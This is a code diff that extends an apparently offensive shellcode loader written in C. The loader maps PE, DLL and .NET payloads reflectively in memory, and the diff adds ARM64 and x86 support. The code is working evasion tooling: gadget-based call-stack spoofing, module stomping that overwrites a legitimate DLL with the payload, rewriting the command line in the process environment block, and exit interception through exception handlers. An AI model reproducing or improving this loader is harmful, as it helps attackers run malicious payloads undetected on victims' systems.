@@ -53,15 +53,28 @@
 #define IMAGE_SIZEOF_BASE_RELOCATION (sizeof(IMAGE_BASE_RELOCATION))
 #endif
 
+#ifndef IMAGE_FILE_MACHINE_ARM64
+#define IMAGE_FILE_MACHINE_ARM64 0xAA64
+#endif
 
-#ifdef _WIN64
+#if defined(_M_ARM64)
+#define HOST_MACHINE IMAGE_FILE_MACHINE_ARM64
+#elif defined(_M_X64)
 #define HOST_MACHINE IMAGE_FILE_MACHINE_AMD64
-#else
+#elif defined(_M_IX86)
 #define HOST_MACHINE IMAGE_FILE_MACHINE_I386
+#else
+#error Unsupported target architecture.
+#endif
+
+#if defined(_M_ARM64)
+#define DW_HAS_EXIT_VEH_PATCH 0
+#else
+#define DW_HAS_EXIT_VEH_PATCH 1
 #endif
 
 
-#include "MemoryModule.h"
+#include "memoryModule.h"
 #include "helpers.h"
 
 
@@ -78,6 +91,15 @@ typedef BOOL (WINAPI *DllEntryProc)(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID 
 typedef int (WINAPI *ExeEntryProc)(void);
 
 
+#ifdef _WIN64
+typedef struct POINTER_LIST
+{
+    struct POINTER_LIST *next;
+    void *address;
+} POINTER_LIST;
+#endif
+
+
 typedef struct {
     PIMAGE_NT_HEADERS headers;
     unsigned char *codeBase;
@@ -92,8 +114,14 @@ typedef struct {
     ExeEntryProc exeEntry;
     DWORD pageSize;
 
+#if DW_HAS_RUNTIME_FUNCTION_TABLE
     PRUNTIME_FUNCTION pdataStart;
     DWORD pdataSize;
+#endif
+
+#ifdef _WIN64
+    POINTER_LIST *blockedMemory;
+#endif
 
 } MEMORYMODULE, *PMEMORYMODULE;
 
@@ -137,6 +165,21 @@ static inline BOOL MM_VirtualFree(INSTANCE* inst, LPVOID lpAddress, SIZE_T dwSiz
 {
     BOOL result = inst->api.VirtualFree(lpAddress, dwSize, dwFreeType);
     return result;
+}
+
+
+static inline VOID MM_GetNativeSystemInfo(INSTANCE* inst, LPSYSTEM_INFO lpSystemInfo)
+{
+    if (!lpSystemInfo)
+        return;
+
+    if (inst && inst->api.GetNativeSystemInfo)
+    {
+        inst->api.GetNativeSystemInfo(lpSystemInfo);
+        return;
+    }
+
+    lpSystemInfo->dwPageSize = 0x1000;
 }
 
 
@@ -203,18 +246,24 @@ static inline ULONG MM_RemoveVectoredExceptionHandler(INSTANCE* inst, PVOID hand
 
 static __forceinline PVOID MmReadArbitraryUserPointer(void)
 {
-#ifdef _WIN64
+#if defined(_M_ARM64)
+    return NtCurrentTeb()->NtTib.ArbitraryUserPointer;
+#elif defined(_M_X64)
     return (PVOID)__readgsqword(0x28);
-#else
+#elif defined(_M_IX86)
     return (PVOID)__readfsdword(0x14);
+#else
+    return NULL;
 #endif
 }
 
 static __forceinline void MmWriteArbitraryUserPointer(PVOID value)
 {
-#ifdef _WIN64
+#if defined(_M_ARM64)
+    NtCurrentTeb()->NtTib.ArbitraryUserPointer = value;
+#elif defined(_M_X64)
     __writegsqword(0x28, (unsigned __int64)(ULONG_PTR)value);
-#else
+#elif defined(_M_IX86)
     __writefsdword(0x14, (unsigned long)(ULONG_PTR)value);
 #endif
 }
@@ -256,11 +305,28 @@ static DWORD WINAPI AfterExeContinuation(LPVOID parameter);
 //
 static inline PVOID FindModule(char* startAdd, ULONG size, char* pattern)
 {
-    for (ULONG x = 0; x < size - 1; x++) 
+    for (ULONG x = 0; x < size - 1; x++)
     {
         if (startAdd[x] == pattern[0] && startAdd[x + 1] == pattern[1])
         {
-            // printf("Found module at %u\n", x);
+#if defined(_M_IX86)
+            if (pattern[0] == 'M' && pattern[1] == 'Z')
+            {
+                if (x + sizeof(IMAGE_DOS_HEADER) > size)
+                    continue;
+
+                PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)(startAdd + x);
+                if (dos->e_lfanew <= 0 || dos->e_lfanew > 0x1000)
+                    continue;
+
+                if (x + (ULONG)dos->e_lfanew + sizeof(DWORD) > size)
+                    continue;
+
+                DWORD signature = *(DWORD *)(startAdd + x + dos->e_lfanew);
+                if (signature != IMAGE_NT_SIGNATURE)
+                    continue;
+            }
+#endif
 
             return (PVOID)(startAdd + x);
         }
@@ -294,7 +360,7 @@ void* memcpy(void* dst, const void* src, size_t len)
 
 #pragma function(memset)
 
-void* memset(void* ptr, int value, unsigned int num) {
+void* memset(void* ptr, int value, size_t num) {
     unsigned char* p = (unsigned char*)ptr;
     while (num--) {
         *p++ = (unsigned char)value;
@@ -320,6 +386,32 @@ int memcmp(const void *s1, const void *s2, size_t n)
     return 0;
 }
 
+#pragma function(wcslen)
+
+size_t wcslen(const wchar_t* str)
+{
+    const wchar_t* start = str;
+    while (*str)
+        str++;
+    return (size_t)(str - start);
+}
+
+#endif
+
+
+#if defined(_M_IX86)
+static __declspec(noinline) char* MmGetCurrentCodeAddress(void)
+{
+    char* address;
+    __asm
+    {
+        call GetAddress
+    GetAddress:
+        pop eax
+        mov address, eax
+    }
+    return address;
+}
 #endif
 
 
@@ -339,11 +431,33 @@ extern PVOID NTAPI Spoof(PVOID a, ...);
 
 PVOID FindGadget(LPBYTE Module, ULONG Size, char* pattern)
 {
-    for (int x = 0; x < Size; x++)
+    (void)Size;
+
+    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)Module;
+    if (!Module || dos->e_magic != IMAGE_DOS_SIGNATURE)
+        return NULL;
+
+    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(Module + dos->e_lfanew);
+    if (nt->Signature != IMAGE_NT_SIGNATURE)
+        return NULL;
+
+    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(nt);
+    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++, section++)
     {
-        if (memcmp(Module + x, pattern, 2) == 0)
+        if ((section->Characteristics & IMAGE_SCN_MEM_EXECUTE) == 0)
+            continue;
+
+        LPBYTE start = Module + section->VirtualAddress;
+        ULONG scanSize = section->Misc.VirtualSize;
+        if (scanSize < 2)
+            continue;
+
+        for (ULONG x = 0; x < scanSize - 1; x++)
         {
-            return (PVOID)(Module + x);
+            if (memcmp(start + x, pattern, 2) == 0)
+            {
+                return (PVOID)(start + x);
+            }
         };
     };
 
@@ -351,6 +465,7 @@ PVOID FindGadget(LPBYTE Module, ULONG Size, char* pattern)
 }
 
 
+#if DW_HAS_STACK_SPOOFING
 /* Credit to VulcanRaven project for the original implementation of these two*/
 ULONG CalculateFunctionStackSize(PRUNTIME_FUNCTION pRuntimeFunction, const DWORD64 ImageBase)
 {
@@ -440,16 +555,6 @@ ULONG CalculateFunctionStackSize(PRUNTIME_FUNCTION pRuntimeFunction, const DWORD
         index += 1;
     }
 
-    // If chained unwind information is present then we need to
-    // also recursively parse this and add to total stack size.
-    //
-    // Not needed for PoC, but could be useful in the future.
-    //
-    if (0 != (pUnwindInfo->Flags & UNW_FLAG_CHAININFO))
-    {
-        // printf(" !!!!!!! chained unwind information is present");
-    }
-
     // Add the size of the return address (8 bytes).
     stackFrame.totalStackSize += 8;
 
@@ -489,6 +594,7 @@ ULONG CalculateFunctionStackSizeWrapper(INSTANCE* inst, PVOID ReturnAddress)
 Cleanup:
     return status;
 }
+#endif
 
 
 //
@@ -518,10 +624,12 @@ void SimpleAnsiToWide(const char* ansi, wchar_t* wide)
 }
 
 
-BOOL SetCommandLineSimple(INSTANCE* inst) 
+BOOL SetCommandLineSimple(INSTANCE* inst)
 {
-#ifdef _M_IX86 
+#ifdef _M_IX86
 	PPEB peb = (PEB *) __readfsdword(0x30);
+#elif defined(_M_ARM64)
+    PPEB peb = NtCurrentTeb()->ProcessEnvironmentBlock;
 #else
 	PPEB peb = (PEB *)__readgsqword(0x60);
 #endif
@@ -566,7 +674,7 @@ BOOL SetCommandLineSimple(INSTANCE* inst)
         return FALSE;
 
     // Get actual current command lines
-    LPWSTR curW = peb->ProcessParameters->CommandLine.Buffer;   //inst->api.GetCommandLineW();
+    LPWSTR curW = peb->ProcessParameters->CommandLine.Buffer;
     LPSTR  curA = MM_GetCommandLineA(inst);                     // The ANSI version (GetCommandLineA()) is typically generated on-demand by converting the wide string (W) to ANSI when the API is called.
 
     LPCWSTR newCmdLine = (LPCWSTR)inst->sCmdLine;
@@ -618,7 +726,7 @@ BOOL SetCommandLineSimple(INSTANCE* inst)
 }
 
 
-typedef void (*LoaderDotNetFunction)(void* data, int size, char* argument);
+typedef int (*LoaderDotNetFunction)(void* data, int size, char* argument);
 typedef void (*StandardEmptyFunction)();
 
 
@@ -640,7 +748,7 @@ int Loader(INSTANCE* inst)
 
     // inst is RX and we need a RW region so we relocate inst
     VirtualAlloc_t pVirtualAlloc;
-    pVirtualAlloc = (VirtualAlloc_t)hlpGetProcAddress(moduleKernel32, (char*)inst->sVirtualAlloc);
+    pVirtualAlloc = (VirtualAlloc_t)pGetProcAddress(moduleKernel32, (char*)inst->sVirtualAlloc);
     char* newInst = pVirtualAlloc(NULL, sizeof(INSTANCE), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
     char* oldInst = (char*)inst;
     for(int i=0; i<sizeof(INSTANCE); i++)
@@ -650,26 +758,23 @@ int Loader(INSTANCE* inst)
     inst->api.GetProcAddress = pGetProcAddress;
 	inst->api.GetModuleHandleA = pGetModuleHandle;
     inst->api.VirtualAlloc = pVirtualAlloc;
-    inst->api.LoadLibraryA = (LoadLibraryA_t)hlpGetProcAddress(moduleKernel32, (char*)inst->sLoadLibraryA);
-    inst->api.VirtualFree = (VirtualFree_t)hlpGetProcAddress(moduleKernel32, (char*)inst->sVirtualFree);
-    inst->api.VirtualProtect = (VirtualProtect_t)hlpGetProcAddress(moduleKernel32, (char*)inst->sVirtualProtect);
-    inst->api.GetCommandLineA = (GetCommandLineA_t)hlpGetProcAddress(moduleKernel32, (char*)inst->sGetCommandLineA);
-    inst->api.RtlAddFunctionTable = (RtlAddFunctionTable_t)hlpGetProcAddress(moduleKernel32, (char*)inst->sRtlAddFunctionTable);
-    inst->api.Sleep = (Sleep_t)hlpGetProcAddress(moduleKernel32, (char*)inst->sSleep);
+    inst->api.LoadLibraryA = (LoadLibraryA_t)pGetProcAddress(moduleKernel32, (char*)inst->sLoadLibraryA);
+    inst->api.VirtualFree = (VirtualFree_t)pGetProcAddress(moduleKernel32, (char*)inst->sVirtualFree);
+    inst->api.VirtualProtect = (VirtualProtect_t)pGetProcAddress(moduleKernel32, (char*)inst->sVirtualProtect);
+    inst->api.GetNativeSystemInfo = (GetNativeSystemInfo_t)pGetProcAddress(moduleKernel32, (char*)inst->sGetNativeSystemInfo);
+    inst->api.GetCommandLineA = (GetCommandLineA_t)pGetProcAddress(moduleKernel32, (char*)inst->sGetCommandLineA);
+#if DW_HAS_RUNTIME_FUNCTION_TABLE
+    inst->api.RtlAddFunctionTable = (RtlAddFunctionTable_t)pGetProcAddress(moduleKernel32, (char*)inst->sRtlAddFunctionTable);
+#endif
+    inst->api.Sleep = (Sleep_t)pGetProcAddress(moduleKernel32, (char*)inst->sSleep);
 
 
     inst->api.AddVectoredExceptionHandler = (AddVectoredExceptionHandler_t)(inst->api.GetProcAddress(inst->api.GetModuleHandleA(inst->sNtDLL), (char*)inst->sAddVectoredExceptionHandler));
     inst->api.RemoveVectoredExceptionHandler = (RemoveVectoredExceptionHandler_t)(inst->api.GetProcAddress(inst->api.GetModuleHandleA(inst->sNtDLL), (char*)inst->sRemoveVectoredExceptionHandler));
-    inst->api.ExitThread = (ExitThread_t)hlpGetProcAddress(moduleKernel32, (char*)inst->sExitThread);
-    inst->api.ExitProcess = (ExitProcess_t)hlpGetProcAddress(moduleKernel32, (char*)inst->sExitProcess);
-    inst->api.FlushInstructionCache = (FlushInstructionCache_t)hlpGetProcAddress(moduleKernel32, (char*)inst->sFlushInstructionCache);
-    inst->api.GetCurrentProcess = (GetCurrentProcess_t)hlpGetProcAddress(moduleKernel32, (char*)inst->sGetCurrentProcess);
-	
-    // For shellcode debug only
-    // HMODULE msvcrt = inst->api.LoadLibraryA(inst->sMsvcrtDLL);
-    // inst->api.Printf = (printf_t)pGetProcAddress(msvcrt, inst->sPrintf);
-    // inst->api.Printf((char*)inst->sDebug);
-
+    inst->api.ExitThread = (ExitThread_t)pGetProcAddress(moduleKernel32, (char*)inst->sExitThread);
+    inst->api.ExitProcess = (ExitProcess_t)pGetProcAddress(moduleKernel32, (char*)inst->sExitProcess);
+    inst->api.FlushInstructionCache = (FlushInstructionCache_t)pGetProcAddress(moduleKernel32, (char*)inst->sFlushInstructionCache);
+    inst->api.GetCurrentProcess = (GetCurrentProcess_t)pGetProcAddress(moduleKernel32, (char*)inst->sGetCurrentProcess);
 #ifdef DEBUG_OUTPUT
     printf("inst->api.GetProcAddress %p\n", inst->api.GetProcAddress);
     printf("inst->api.GetModuleHandleA %p\n", inst->api.GetModuleHandleA);
@@ -677,8 +782,11 @@ int Loader(INSTANCE* inst)
     printf("inst->api.LoadLibraryA %p\n", inst->api.LoadLibraryA);
     printf("inst->api.VirtualFree %p\n", inst->api.VirtualFree);
     printf("inst->api.VirtualProtect %p\n", inst->api.VirtualProtect);
+    printf("inst->api.GetNativeSystemInfo %p\n", inst->api.GetNativeSystemInfo);
     printf("inst->api.GetCommandLineA %p\n", inst->api.GetCommandLineA);
+#if DW_HAS_RUNTIME_FUNCTION_TABLE
     printf("inst->api.RtlAddFunctionTable %p\n", inst->api.RtlAddFunctionTable);
+#endif
 
     printf("inst->api.Sleep %p\n", inst->api.Sleep);
     printf("inst->api.AddVectoredExceptionHandler %p\n", inst->api.AddVectoredExceptionHandler);
@@ -689,20 +797,28 @@ int Loader(INSTANCE* inst)
     // search for the start of the module
     void* moduleAddress = NULL;
 
-    char* startAdd = (char*)(void*)Loader;
-    moduleAddress = FindModule(startAdd + inst->loaderSize, 100, (char*)inst->sMagicBytes);
-
 #ifdef DEBUG_OUTPUT
     if(inst->ptrModuleTst)
-    {   
+    {
         printf("inst->ptrModuleTst %p\n", inst->ptrModuleTst);
         moduleAddress = inst->ptrModuleTst;
     }
+    else
 #endif
+    {
+#if defined(_M_IX86)
+        char* startAdd = MmGetCurrentCodeAddress();
+        moduleAddress = FindModule(startAdd, inst->loaderSize + 0x400, (char*)inst->sMagicBytes);
+#else
+        char* startAdd = (char*)(void*)Loader;
+        moduleAddress = FindModule(startAdd + inst->loaderSize, 100, (char*)inst->sMagicBytes);
+#endif
+    }
 
     if(!moduleAddress)
         return 0;
 
+#if DW_HAS_STACK_SPOOFING
     //
     // LoudSunRun -> we need a gadget to perform the return to this function for DLL, for EXE we remove the gadget for cleaner call stack, because we don't come back this way
     //
@@ -724,6 +840,7 @@ int Loader(INSTANCE* inst)
     p.RUTS_retaddr = ReturnAddress;
 
     p.Gadget_ss = CalculateFunctionStackSizeWrapper(inst, p.trampoline);
+#endif
     
     //
     // DotNet
@@ -732,16 +849,23 @@ int Loader(INSTANCE* inst)
     {
         // Find the .NET module after the dotnet loader module
         void* dotnetModule = NULL;
-        dotnetModule = FindModule((char*)(void*)moduleAddress+inst->dotnetLoaderSize, 100, (char*)inst->sMagicBytes);
 
 #ifdef DEBUG_OUTPUT
         // in case of debug the module will not be following the loader, because we are not in a shellcode
         if(inst->ptrDotNetModuleTst)
-        {   
+        {
             printf("inst->ptrDotNetModuleTst %p\n", inst->ptrDotNetModuleTst);
             dotnetModule = inst->ptrDotNetModuleTst;
         }
+        else
 #endif
+        {
+#if defined(_M_IX86)
+            dotnetModule = FindModule((char*)(void*)moduleAddress+inst->dotnetLoaderSize, 0x400, (char*)inst->sMagicBytes);
+#else
+            dotnetModule = FindModule((char*)(void*)moduleAddress+inst->dotnetLoaderSize, 100, (char*)inst->sMagicBytes);
+#endif
+        }
 
         if(!dotnetModule)
         {
@@ -749,21 +873,57 @@ int Loader(INSTANCE* inst)
         }
 
         // Load module
+#ifdef DEBUG_OUTPUT
+        printf("DotNet MemoryLoadLibrary loader size %u\n", inst->dotnetLoaderSize);
+#endif
         HMEMORYMODULE moduleHandle = MemoryLoadLibrary(inst, moduleAddress, inst->dotnetLoaderSize);
-        if (!moduleHandle) 
+        if (!moduleHandle)
         {
-            return 0; 
+#ifdef DEBUG_OUTPUT
+            printf("[!] DotNet MemoryLoadLibrary failed\n");
+#endif
+            return 0;
         }
 
         void* func = MemoryGetProcAddress(inst, moduleHandle, inst->sdllMethode);
+        if (!func)
+        {
+#ifdef DEBUG_OUTPUT
+            printf("[!] DotNet export %s not found\n", inst->sdllMethode);
+#endif
+            return 0;
+        }
+
+#ifdef DEBUG_OUTPUT
+        printf("DotNet export %s %p\n", inst->sdllMethode, func);
+        printf("DotNet invoking loader with module size %u\n", inst->dotnetModuleSize);
+#endif
 
         // LoaderDotNetFunction _loaderDotNetFunction = (LoaderDotNetFunction)func;
         // _loaderDotNetFunction(dotnetModule, inst->dotnetModuleSize, inst->sCmdLine);
 
         // TODO handle the exit of the managed code in DotnetExe.cpp
+        int dotnetStatus = 0;
+#if DW_HAS_STACK_SPOOFING
         SpoofWithReturn(dotnetModule, inst->dotnetModuleSize, inst->sCmdLine, NULL, &p, func, (PVOID)0);
+#else
+        dotnetStatus = ((LoaderDotNetFunction)func)(dotnetModule, inst->dotnetModuleSize, (char*)inst->sCmdLine);
+#endif
+
+#ifdef DEBUG_OUTPUT
+        printf("DotNet loader returned %d\n", dotnetStatus);
+        if (dotnetStatus != 0)
+            return dotnetStatus;
+#endif
 
         BYTE mode = inst->exitMode;
+#ifdef DEBUG_OUTPUT
+        if (mode == 0)
+        {
+            printf("DotNet return - debug no-exit\n");
+            return 0;
+        }
+#endif
         if (mode != 2 && mode != 3)
             mode = 1;
     
@@ -773,7 +933,11 @@ int Loader(INSTANCE* inst)
     
         if (mode == 3) {
             for (;;) {
+#if DW_HAS_STACK_SPOOFING
                 SpoofWithReturn(1000, NULL, NULL, NULL, &p, inst->api.Sleep, (PVOID)0);
+#else
+                inst->api.Sleep(1000);
+#endif
             }
         }
     
@@ -826,7 +990,7 @@ int Loader(INSTANCE* inst)
 
             // module->exeEntry();
 
-#ifdef DEBUG_OUTPUT
+#if defined(DEBUG_OUTPUT) && DW_HAS_RUNTIME_FUNCTION_TABLE
             // check if stack unwinding is supported
             DWORD64 imageBase = 0;
             PRUNTIME_FUNCTION fn = RtlLookupFunctionEntry((DWORD64)module->exeEntry, &imageBase, NULL);
@@ -838,10 +1002,16 @@ int Loader(INSTANCE* inst)
 #endif
 
             // Handle exit of exe using VEH
+#if DW_HAS_EXIT_VEH_PATCH
             InstallExitVEH(inst);
+#endif
 
             // __debugbreak();
+#if DW_HAS_STACK_SPOOFING
             SpoofNoReturn(NULL, NULL, NULL, NULL, &p, module->exeEntry, (PVOID)0);
+#else
+            module->exeEntry();
+#endif
 
             // we never come back here
 #ifdef DEBUG_OUTPUT
@@ -868,7 +1038,7 @@ int Loader(INSTANCE* inst)
             // StandardEmptyFunction _func = (StandardEmptyFunction)func;
             // _func();
 
-#ifdef DEBUG_OUTPUT
+#if defined(DEBUG_OUTPUT) && DW_HAS_RUNTIME_FUNCTION_TABLE
             // check if stack unwinding is supported
             DWORD64 imageBase = 0;
             PRUNTIME_FUNCTION fn = RtlLookupFunctionEntry((DWORD64)func, &imageBase, NULL);
@@ -881,9 +1051,20 @@ int Loader(INSTANCE* inst)
 
             // __debugbreak();
 
+#if DW_HAS_STACK_SPOOFING
             SpoofWithReturn(NULL, NULL, NULL, NULL, &p, func, (PVOID)0);
+#else
+            ((StandardEmptyFunction)func)();
+#endif
 
             BYTE mode = inst->exitMode;
+#ifdef DEBUG_OUTPUT
+            if (mode == 0)
+            {
+                printf("DLL return - debug no-exit\n");
+                return 0;
+            }
+#endif
             if (mode != 2 && mode != 3)
                 mode = 1;
         
@@ -893,7 +1074,11 @@ int Loader(INSTANCE* inst)
         
             if (mode == 3) {
                 for (;;) {
+#if DW_HAS_STACK_SPOOFING
                     SpoofWithReturn(1000, NULL, NULL, NULL, &p, inst->api.Sleep, (PVOID)0);
+#else
+                    inst->api.Sleep(1000);
+#endif
                 }
             }
         
@@ -939,9 +1124,9 @@ static inline void* OffsetPointer(void* data, ptrdiff_t offset)
 }
 
 
-static inline BOOL CheckSize(size_t size, size_t expected) 
+static inline BOOL CheckSize(size_t size, size_t expected)
 {
-    if (size < expected) 
+    if (size < expected)
     {
         // SetLastError(ERROR_INVALID_DATA);
         return FALSE;
@@ -951,15 +1136,40 @@ static inline BOOL CheckSize(size_t size, size_t expected)
 }
 
 
+#ifdef _WIN64
+static inline BOOL MemorySpans4GbBoundary(unsigned char *code, size_t size)
+{
+    return (((uintptr_t) code) >> 32) < (((uintptr_t) (code + size)) >> 32);
+}
+
+
+static void FreePointerList(INSTANCE* inst, POINTER_LIST *head)
+{
+    POINTER_LIST *node = head;
+    while (node)
+    {
+        POINTER_LIST *next = node->next;
+        MM_VirtualFree(inst, node->address, 0, MEM_RELEASE);
+        MM_VirtualFree(inst, node, 0, MEM_RELEASE);
+        node = next;
+    }
+}
+#endif
+
+
 static inline BOOL CopySections(INSTANCE* inst ,const unsigned char *data, size_t size, PIMAGE_NT_HEADERS old_headers, PMEMORYMODULE module)
 {
     int i, section_size;
     unsigned char *codeBase = module->codeBase;
     unsigned char *dest;
     PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(module->headers);
-    for (i=0; i<module->headers->FileHeader.NumberOfSections; i++, section++) 
+    for (i=0; i<module->headers->FileHeader.NumberOfSections; i++, section++)
     {
-        if (section->SizeOfRawData == 0) 
+        DWORD sectionStart = section->VirtualAddress;
+        DWORD sectionVirtualSize = section->Misc.VirtualSize;
+        DWORD sectionRawSize = section->SizeOfRawData;
+
+        if (section->SizeOfRawData == 0)
         {
             // section doesn't contain data in the dll itself, but may define
             // uninitialized data
@@ -977,8 +1187,7 @@ static inline BOOL CopySections(INSTANCE* inst ,const unsigned char *data, size_
                 // NOTE: On 64bit systems we truncate to 32bit here but expand
                 // again later when "PhysicalAddress" is used.
                 section->Misc.PhysicalAddress = (DWORD) ((uintptr_t) dest & 0xffffffff);
-                // memset(dest, 0, section_size);
-				__stosb(dest, 0, section_size);
+                memset(dest, 0, section_size);
             }
 
             // section is empty
@@ -1006,17 +1215,30 @@ static inline BOOL CopySections(INSTANCE* inst ,const unsigned char *data, size_
         // again later when "PhysicalAddress" is used.
         section->Misc.PhysicalAddress = (DWORD) ((uintptr_t) dest & 0xffffffff);
 
-        if (memcmp(section->Name, inst->sPDataSec, 6) == 0) 
-        {
+#if DW_HAS_RUNTIME_FUNCTION_TABLE
+        DWORD exceptionRva = old_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION].VirtualAddress;
+        DWORD exceptionSize = old_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION].Size;
+        DWORD sectionSpan = sectionVirtualSize;
+        if (sectionRawSize > sectionSpan)
+            sectionSpan = sectionRawSize;
+        DWORD sectionEnd = sectionStart + sectionSpan;
 
-            module->pdataStart = (PRUNTIME_FUNCTION)(codeBase + section->VirtualAddress);
-            module->pdataSize = section->SizeOfRawData;
+        if (exceptionRva && exceptionSize && exceptionRva >= sectionStart && exceptionRva < sectionEnd)
+        {
+            DWORD maxExceptionSize = sectionEnd - exceptionRva;
+            if (exceptionSize > maxExceptionSize)
+                exceptionSize = maxExceptionSize;
+
+            module->pdataStart = (PRUNTIME_FUNCTION)(codeBase + exceptionRva);
+            module->pdataSize = exceptionSize;
 
 #ifdef DEBUG_OUTPUT
             printf("section->Name %s\n", section->Name);
-            printf("module->pdataStart %p\n", dest);
+            printf("module->pdataStart %p\n", module->pdataStart);
+            printf("module->pdataSize %lu\n", module->pdataSize);
 #endif
         }
+#endif
 
     }
 
@@ -1112,9 +1334,24 @@ static inline BOOL FinalizeSection(INSTANCE* inst, PMEMORYMODULE module, PSECTIO
     }
 
     // change memory access flags
-    if (MM_VirtualProtect(inst, sectionData->address, sectionData->size, protect, &oldProtect) == 0) 
+    if (MM_VirtualProtect(inst, sectionData->address, sectionData->size, protect, &oldProtect) == 0)
     {
         return FALSE;
+    }
+
+    if (executable)
+    {
+        HANDLE process = MM_GetCurrentProcess(inst);
+        if (process && !MM_FlushInstructionCache(inst, process, sectionData->address, sectionData->size))
+        {
+            return FALSE;
+        }
+
+#ifdef DEBUG_OUTPUT
+        printf("FlushInstructionCache section=%p size=%llu\n",
+            sectionData->address,
+            (unsigned long long)sectionData->size);
+#endif
     }
 
     return TRUE;
@@ -1371,6 +1608,11 @@ HMEMORYMODULE MemoryLoadLibrary(INSTANCE* inst, const void *data, size_t size)
     size_t optionalSectionSize;
     size_t lastSectionEnd = 0;
     size_t alignedImageSize;
+    SYSTEM_INFO sysInfo;
+    DWORD pageSize;
+#ifdef _WIN64
+    POINTER_LIST *blockedMemory = NULL;
+#endif
 
     if (!CheckSize(size, sizeof(IMAGE_DOS_HEADER))) 
         return NULL;
@@ -1413,8 +1655,12 @@ HMEMORYMODULE MemoryLoadLibrary(INSTANCE* inst, const void *data, size_t size)
         }
     }
 
-    alignedImageSize = AlignValueUp(old_header->OptionalHeader.SizeOfImage, 0x1000);
-    if (alignedImageSize != AlignValueUp(lastSectionEnd, 0x1000)) 
+    sysInfo.dwPageSize = 0;
+    MM_GetNativeSystemInfo(inst, &sysInfo);
+    pageSize = sysInfo.dwPageSize ? sysInfo.dwPageSize : 0x1000;
+
+    alignedImageSize = AlignValueUp(old_header->OptionalHeader.SizeOfImage, pageSize);
+    if (alignedImageSize != AlignValueUp(lastSectionEnd, pageSize))
         return NULL;
     
     if(inst->isModuleStompingUsed==0)
@@ -1423,13 +1669,41 @@ HMEMORYMODULE MemoryLoadLibrary(INSTANCE* inst, const void *data, size_t size)
         // XXX: is it correct to commit the complete memory region at once?
         //      calling DllEntry raises an exception if we don't...
         code = (unsigned char *)MM_VirtualAlloc(inst, (LPVOID)(old_header->OptionalHeader.ImageBase), alignedImageSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
-        if (code == NULL) 
+        if (code == NULL)
         {
             // try to allocate memory at arbitrary position
             code = (unsigned char *)MM_VirtualAlloc(inst, NULL, alignedImageSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
-            if (code == NULL) 
+            if (code == NULL)
                 return NULL;
         }
+
+#ifdef _WIN64
+        // Section addresses are stored as low 32 bits until FinalizeSections.
+        // Keep retrying if the image would cross a 4 GB boundary.
+        while (MemorySpans4GbBoundary(code, alignedImageSize))
+        {
+            POINTER_LIST *node = (POINTER_LIST *)MM_VirtualAlloc(inst, NULL, sizeof(POINTER_LIST),
+                MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+            if (!node)
+            {
+                MM_VirtualFree(inst, code, 0, MEM_RELEASE);
+                FreePointerList(inst, blockedMemory);
+                return NULL;
+            }
+
+            node->next = blockedMemory;
+            node->address = code;
+            blockedMemory = node;
+
+            code = (unsigned char *)MM_VirtualAlloc(inst, NULL, alignedImageSize,
+                MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
+            if (code == NULL)
+            {
+                FreePointerList(inst, blockedMemory);
+                return NULL;
+            }
+        }
+#endif
     }
     else
     {
@@ -1437,23 +1711,41 @@ HMEMORYMODULE MemoryLoadLibrary(INSTANCE* inst, const void *data, size_t size)
         // module stomping
         //
         HMODULE victimLib = MM_LoadLibraryA(inst, (char*)inst->sModuleToStomp);
-        char * ptr = (char *) victimLib + 4096*2;
+        if (!victimLib)
+            return NULL;
 
-        DWORD oldprotect = 0;		
-        int ret = MM_VirtualProtect(inst, (char *)ptr, alignedImageSize+4096, PAGE_READWRITE, &oldprotect);
-        __stosb(ptr, 0, alignedImageSize + 4096);
-        
+        char * ptr = (char *) victimLib + pageSize * 2;
         code = ptr;
+#ifdef _WIN64
+        if (MemorySpans4GbBoundary(code, alignedImageSize))
+            return NULL;
+#endif
+
+        DWORD oldprotect = 0;
+        if (!MM_VirtualProtect(inst, (char *)ptr, alignedImageSize + pageSize, PAGE_READWRITE, &oldprotect))
+            return NULL;
+
+        memset(ptr, 0, alignedImageSize + pageSize);
     }
 
     result = (PMEMORYMODULE) MM_VirtualAlloc(inst, NULL, sizeof(MEMORYMODULE), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-    if (result == NULL) 
+    if (result == NULL)
+    {
+#ifdef _WIN64
+        FreePointerList(inst, blockedMemory);
+#endif
+        if (inst->isModuleStompingUsed == 0)
+            MM_VirtualFree(inst, code, 0, MEM_RELEASE);
         return NULL;
+    }
 
     result->codeBase = code;
     result->inst = inst;
     result->isDLL = (old_header->FileHeader.Characteristics & IMAGE_FILE_DLL) != 0;
-    result->pageSize = 0x1000;
+    result->pageSize = pageSize;
+#ifdef _WIN64
+    result->blockedMemory = blockedMemory;
+#endif
 
     if (!CheckSize(size, old_header->OptionalHeader.SizeOfHeaders))
         return NULL;
@@ -1504,8 +1796,20 @@ HMEMORYMODULE MemoryLoadLibrary(INSTANCE* inst, const void *data, size_t size)
 
     // __debugbreak();
 
-    DWORD functionCount = result->pdataSize / sizeof(RUNTIME_FUNCTION);
-    inst->api.RtlAddFunctionTable(result->pdataStart, functionCount, (DWORD64)result->codeBase);
+#if DW_HAS_RUNTIME_FUNCTION_TABLE
+    if (result->pdataStart && result->pdataSize)
+    {
+        DWORD functionCount = result->pdataSize / sizeof(RUNTIME_FUNCTION);
+        BOOLEAN functionTableAdded = inst->api.RtlAddFunctionTable(result->pdataStart, functionCount, (DWORD64)result->codeBase);
+#ifdef DEBUG_OUTPUT
+        printf("RtlAddFunctionTable table=%p count=%lu base=%p ret=%u\n",
+            result->pdataStart,
+            functionCount,
+            result->codeBase,
+            functionTableAdded);
+#endif
+    }
+#endif
 
     // get entry point of loaded library	
